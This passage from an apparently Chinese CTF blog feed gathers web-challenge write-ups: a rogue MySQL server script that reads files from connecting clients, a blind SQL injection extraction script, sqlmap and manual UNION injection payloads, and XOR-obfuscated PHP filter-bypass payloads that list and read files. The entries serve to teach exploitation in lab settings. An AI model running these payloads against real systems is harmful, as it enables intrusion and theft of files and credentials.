class="string">&quot;\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00 &quot;</span></span><br><span class="line"></span><br><span class="line">conn.sendall(greeting1)</span><br><span class="line"></span><br><span class="line">conn.recv(<span class="number">9999</span>) <span class="comment">#接收信息</span></span><br><span class="line">logging.info(<span class="string">&quot;auth okay&quot;</span>) <span class="comment">#response ok 建立连接</span></span><br><span class="line">conn.sendall(<span class="string">&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>) <span class="comment">#接收信息</span></span><br><span class="line">logging.info(<span class="string">&quot;want file...&quot;</span>)</span><br><span class="line"><span class="comment">#file-transfer 文件传输请求,根据长度自动构造</span></span><br><span class="line">wantfile = <span class="built_in">chr</span>(<span class="built_in">len</span>(filename) + <span class="number">1</span>) + <span class="string">&quot;\x00\x00\x01\xFB&quot;</span> + filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content = conn.recv(<span class="number">9999</span>) <span class="comment">#接收信息</span></span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><h4><span id="攻击测试">攻击测试</span></h4><p>服务器在 <code>6666</code> 开启服务</p><p>客户机：<code>mysql -h ip:xxxxx -P 6666 --enable-local-infile</code></p><img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908174329155.png" alt="image-20210908174329155" style="zoom:80%;"><p>效果拔群🤣！</p><h4><span id="其他poc">其他PoC</span></h4><p>大佬脚本：<a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><blockquote><p>脚本运行后，会在当前目录下生成mysql.log目录，有客户端连接上后，进行记录，并且将文件读取存入，我们打开mysql.log文件，可以看到成功读取。</p></blockquote><h4><span id="学习">学习</span></h4><p>学习大佬的总结😂：</p><blockquote><p>对于这种攻击的防御，说起来比较简单，首先一点就是客户端要避免使用 LOCAL 来读取本地文件。但是这样并不能避免连接到恶意的服务器上，如果想规避这种情况，可以使用<code>--ssl-mode=VERIFY_IDENTITY</code>来建立可信的连接。</p><p>当然最靠谱的方式还是要从配置文件上根治，关于配置上的防御问题，可以参考<a href="https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html">这篇文档</a>进行设置。</p><p>用途的话，做蜜罐是肯定可以的，但是受众面好像不太完整，各种语言的支持都不太一样，比如 Python 中的 MySQLdb 包，原作者说这个包不受影响，但是我测试的时候确是受影响的，而 PHP+PDO 的方式又不受影响，所以能否中招还是要靠一些运气。</p><p>而且这些语言中的三方包在连接<code>MySQL</code>的时候，基本上在连接成功之后都会发出一下<code>SELECT</code>语句来查询一些版本号、编码之类的数据，这就达成了前面提到过的第二个攻击条件：等待客户端发来一个<code>QUERY</code>请求，所以如果这些第三方包允许执行<code>LOAD DATA INFILE</code>，危害还是比较大的。</p></blockquote><p>参考文章:<br><a href="https://www.cnblogs.com/Rain99-/p/13334755.html">Mysql服务端反向读取客户端的任意文件</a></p><p><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/">MySQL connect file read</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;伪造MySQL服务器对客户端实现任意文件读取&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>Black-Watch-入群题-Web</title>
    <link href="http://example.com/2021/09/07/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/"/>
    <id>http://example.com/2021/09/07/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/</id>
    <published>2021-09-07T01:10:36.980Z</published>
    <updated>2021-09-07T01:15:28.287Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>sql数字型盲注</p><a id="more"></a></blockquote><p>点击热点列表，存在一个<code>id</code>索引，测试<code>2/2</code>返回<code>id=1</code>的内容，判断为数字型注入，测试发现可以盲注，没什么过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url0 = <span class="string">&quot;http://89f00b7b-7f72-4344-a14d-126dd667006a.node4.buuoj.cn:81/backend/content_detail.php?id=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&quot;if(ord(substr(database(),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)&quot;</span></span><br><span class="line"><span class="comment"># 库名</span></span><br><span class="line">sql2 = <span class="string">&quot;if(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)&quot;</span></span><br><span class="line"><span class="comment"># 表名</span></span><br><span class="line">sql3 = <span class="string">&quot;if(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;admin&#x27;)),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)&quot;</span></span><br><span class="line"><span class="comment"># 列名</span></span><br><span class="line">sql4 = <span class="string">&quot;if(ord(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)&quot;</span></span><br><span class="line"><span class="comment"># 数据</span></span><br><span class="line"></span><br><span class="line">url = url0.<span class="built_in">format</span>(sql4)</span><br><span class="line"><span class="comment"># 选择查询语句</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> right &gt; left:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        x = <span class="built_in">str</span>(x)</span><br><span class="line">        y = <span class="built_in">str</span>(mid)</span><br><span class="line">        pay = url.<span class="built_in">format</span>(x, y)</span><br><span class="line">        response = requests.get(url=pay)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;title&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            left = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.02</span>)  <span class="comment">#防止脏数据</span></span><br><span class="line">    <span class="comment"># print(pay)</span></span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    flag += (<span class="built_in">chr</span>(<span class="built_in">int</span>(right)))</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">int</span>(right)))</span><br><span class="line">    print(flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>获取admin表中的账号，登录获得flag</p><div class="toc" tabindex="1"><!-- toc --><!-- tocstop --></div><br>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;sql数字型盲注&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>b01lers2020-Life_on_Mars</title>
    <link href="http://example.com/2021/09/03/b01lers2020-Life_on_Mars/"/>
    <id>http://example.com/2021/09/03/b01lers2020-Life_on_Mars/</id>
    <published>2021-09-03T09:42:32.238Z</published>
    <updated>2021-09-03T10:37:07.834Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>sqlmap使用练习</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#sqlmap">sqlmap</a></li><li><a href="#%E6%89%8B%E5%B7%A5">手工</a></li></ul><!-- tocstop --></div><br><blockquote><p>为了快速探测漏洞，自动化扫描很重要，专门来练习sqlmap</p></blockquote><h4><span id="sqlmap">sqlmap</span></h4><img src="/images/b01lers2020-Life_on_Mars/image-20210903174505885.png" alt="image-20210903174505885" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http:&#x2F;&#x2F;0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81&#x2F;query?search&#x3D;chryse_planitia</span><br></pre></td></tr></table></figure><img src="/images/b01lers2020-Life_on_Mars/image-20210903174656965.png" alt="image-20210903174656965" style="zoom:80%;"><p>联合查询……</p><p>获得库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http:&#x2F;&#x2F;0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81&#x2F;query?search&#x3D;chryse_planitia --dbs</span><br></pre></td></tr></table></figure><img src="/images/b01lers2020-Life_on_Mars/image-20210903174917424.png" alt="image-20210903174917424" style="zoom:80%;"><p>获得表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http:&#x2F;&#x2F;0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81&#x2F;query?search&#x3D;chryse_planitia --tables -D alien_code</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903175030391.png" alt="image-20210903175030391" style="zoom:80%;">.</p><p>获得字段名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http://0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81/query?search=chryse_planitia --columns -D alien_code -T code</span><br></pre></td></tr></table></figure><img src="/images/b01lers2020-Life_on_Mars/image-20210903175142744.png" alt="image-20210903175142744" style="zoom:80%;"><p>获取字段内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u http://0c19c7b8-e7ab-42d6-8d0a-b7c974af36e7.node4.buuoj.cn:81/query?search=chryse_planitia --dump -D alien_code -T code -C code</span><br></pre></td></tr></table></figure><img src="/images/b01lers2020-Life_on_Mars/image-20210903175252109.png" alt="image-20210903175252109" style="zoom:80%;"><p>获得flag！</p><h4><span id="手工">手工</span></h4><p>获取库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;chryse_planitia&#x2F;**&#x2F;union(select(1),(group_concat(schema_name))from(information_schema.schemata))--+</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903182412381.png" alt="image-20210903182412381"></p><p>获取表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;chryse_planitia&#x2F;**&#x2F;union(select(1),(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;alien_code&#39;))from(information_schema.schemata))--+</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903182623802.png" alt="image-20210903182623802"></p><p>获取字段名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;chryse_planitia&#x2F;**&#x2F;union(select(1),(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;code&#39;))from(information_schema.schemata))--+</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903183329390.png" alt="image-20210903183329390"></p><p>flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;chryse_planitia&#x2F;**&#x2F;union(select(1),(select(code)from(alien_code.code)))--+</span><br></pre></td></tr></table></figure><p><img src="/images/b01lers2020-Life_on_Mars/image-20210903183648548.png" alt="image-20210903183648548"></p><p>wuhu~</p><p>参考文章:<br><a href="https://www.jianshu.com/p/5b4eac2e071d">sqlmap常用命令及用法</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;sqlmap使用练习&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>ISITDTU-2019-EasyPHP</title>
    <link href="http://example.com/2021/09/03/ISITDTU-2019-EasyPHP/"/>
    <id>http://example.com/2021/09/03/ISITDTU-2019-EasyPHP/</id>
    <published>2021-09-03T03:15:58.421Z</published>
    <updated>2021-09-03T04:08:29.293Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>取反、异或、bypass、rce</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E6%BA%90%E7%A0%81">源码</a></li><li><a href="#%E7%BB%95%E8%BF%87">绕过</a></li></ul><!-- tocstop --></div><br><h4><span id="源码">源码</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>\x00- 0-9                       匹配\x00到空格(\x20)，0-9的数字<br>‘“`$&amp;.,|[{_defgops              匹配这些字符<br>\x7F                            匹配DEL(\x7F)字符</p></blockquote><p>同时要求使用的符号不得超过16</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ok = [];</span><br><span class="line">$s  = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">$match = <span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    $char = chr($i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match($match, $char))&#123;</span><br><span class="line">        $ok[$i] = $char;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($ok);</span><br></pre></td></tr></table></figure><p>查可用的字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$array=get_defined_functions();<span class="comment">//返回所有内置定义函数</span></span><br><span class="line">$match = <span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match($match, $arr) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( strlen(count_chars(strtolower($arr), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>($arr.PHP_EOL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可直接使用的函数</p><p>很少，还是要根据取反的思路来构造。没有限制字符串总长度，可以肆意构造</p><h4><span id="绕过">绕过</span></h4><p>接下来绕过字符数</p><p>除去<code>() ; ^ %ff</code>，可用字符只有9种</p><p>比如我们构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">((%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D)^(%FF%FF%FF%FF%FF%FF%FF))(((%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D)^(%FF%FF%FF%FF%FF%FF%FF))((%D1)^(%FF)));</span><br><span class="line"><span class="comment">//print_r(scandir(.))</span></span><br></pre></td></tr></table></figure><p>此时使用字符有16种，我们需要通过反复异或来用其他字符表示这三个字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先: a^a^a &#x3D; a</span><br><span class="line">若: c^d^i &#x3D; n</span><br><span class="line">则: ~n &#x3D; ~c^d^i &#x3D;&gt; n^0xff &#x3D; c^d^i^0xff</span><br><span class="line">其他字符: a^a^a^0xff &#x3D; a^0xff &#x3D; a^0xff^0xff^0xff</span><br></pre></td></tr></table></figure><p>所以我们指定规则，对要替换的字符找三个异或字符串(<em>不影响其他字符</em>)，后再构造一次异或，就可以替换指定字符。</p><p>规则脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;scdeafle&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;nir&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(a)^<span class="built_in">ord</span>(b)^<span class="built_in">ord</span>(c) == <span class="built_in">ord</span>(m):</span><br><span class="line">                    print(<span class="string">&quot;&#123;&#125; = &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;</span>.<span class="built_in">format</span>(m, a, b, c), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                    print(<span class="string">&quot; ---&gt; &quot;</span>+<span class="string">&quot;%&#123;:x&#125; = %&#123;:x&#125; ^ %&#123;:x&#125; ^ %&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(m)^<span class="number">255</span>, <span class="built_in">ord</span>(a)^<span class="number">255</span>, <span class="built_in">ord</span>(b)^<span class="number">255</span>, <span class="built_in">ord</span>(c)^<span class="number">255</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                    print(<span class="string">&quot; ===&gt; &quot;</span>+<span class="string">&quot;&#x27;&#123;&#125;&#x27;,[&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;]&quot;</span>.<span class="built_in">format</span>(m,a,b,c))</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/images/ISITDTU-2019-EasyPHP/image-20210903114357978.png" alt="image-20210903114357978" style="zoom:80%;"><p>字符串生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//@inanb</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rep</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $t;</span><br><span class="line">    <span class="keyword">public</span> $e1;</span><br><span class="line">    <span class="keyword">public</span> $e2;</span><br><span class="line">    <span class="keyword">public</span> $e3;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$target,$arry</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;t = $target;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;e1 = $arry[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;e2 = $arry[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;e3 = $arry[<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fullescape</span>(<span class="params">$in</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $out = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($in);$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $hex = dechex(ord($in[$i]));</span><br><span class="line">        <span class="keyword">if</span> ($hex==<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            $out = $out.urlencode($in[$i]);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            $out = $out .<span class="string">&#x27;%&#x27;</span>.((strlen($hex)==<span class="number">1</span>) ? (<span class="string">&#x27;0&#x27;</span>.strtoupper($hex)):(strtoupper($hex)));</span><br><span class="line">    &#125;</span><br><span class="line">    $out = str_replace(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;%20&#x27;</span>,$out);</span><br><span class="line">    $out = str_replace(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;%5F&#x27;</span>,$out);</span><br><span class="line">    $out = str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;%2E&#x27;</span>,$out);</span><br><span class="line">    $out = str_replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;%2D&#x27;</span>,$out);</span><br><span class="line">    <span class="keyword">return</span> $out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str = <span class="string">&quot;scandir&quot;</span>; $len = strlen($str); $str1 = $str2 = $str3 = $str;</span><br><span class="line">$xor = str_repeat(<span class="string">&quot;%ff&quot;</span>, $len);</span><br><span class="line"></span><br><span class="line">$mode1 = <span class="keyword">new</span> rep(<span class="string">&#x27;n&#x27;</span>,[<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;l&#x27;</span>]);</span><br><span class="line">$mode2 = <span class="keyword">new</span> rep(<span class="string">&quot;i&quot;</span>,[<span class="string">&quot;c&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;l&quot;</span>]);</span><br><span class="line">$mode3 = <span class="keyword">new</span> rep(<span class="string">&quot;r&quot;</span>,[<span class="string">&quot;s&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>]);</span><br><span class="line"></span><br><span class="line">$str1 = str_replace($mode1-&gt;t,$mode1-&gt;e1,$str1);$str2 = str_replace($mode1-&gt;t,$mode1-&gt;e2,$str2);$str3 = str_replace($mode1-&gt;t,$mode1-&gt;e3,$str3);</span><br><span class="line">$str1 = str_replace($mode2-&gt;t,$mode2-&gt;e1,$str1);$str2 = str_replace($mode2-&gt;t,$mode2-&gt;e2,$str2);$str3 = str_replace($mode2-&gt;t,$mode2-&gt;e3,$str3);</span><br><span class="line">$str1 = str_replace($mode3-&gt;t,$mode3-&gt;e1,$str1);$str2 = str_replace($mode3-&gt;t,$mode3-&gt;e2,$str2);$str3 = str_replace($mode3-&gt;t,$mode3-&gt;e3,$str3);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;((&#x27;</span>.fullescape(~$str1).<span class="string">&#x27;)^(&#x27;</span>.fullescape(~$str2).<span class="string">&#x27;)^(&#x27;</span>.fullescape(~$str3).<span class="string">&#x27;)^(&#x27;</span>.$xor.<span class="string">&#x27;))&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>写得有点粗糙🤣，添加规则需要加mode，并对三个字串再处理一下</p></blockquote><p>目录下有一个flag文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//readfile(end(scandir(.))) end返回数组最后一个元素</span></span><br><span class="line">((%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">9</span>C%<span class="number">93</span>%<span class="number">9</span>A)^(%<span class="number">9</span>B%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>A)^(%<span class="number">9</span>A%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">9</span>A)^(%ff%ff%ff%ff%ff%ff%ff%ff))(((%<span class="number">9</span>A%<span class="number">9</span>C%<span class="number">9</span>B)^(%<span class="number">9</span>A%<span class="number">9</span>E%<span class="number">9</span>B)^(%<span class="number">9</span>A%<span class="number">93</span>%<span class="number">9</span>B)^(%ff%ff%ff))(((%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">9</span>C%<span class="number">9</span>B%<span class="number">9</span>C%<span class="number">8</span>C)^(%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">9</span>B%<span class="number">99</span>%<span class="number">9</span>B)^(%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">93</span>%<span class="number">9</span>B%<span class="number">93</span>%<span class="number">9</span>A)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure><img 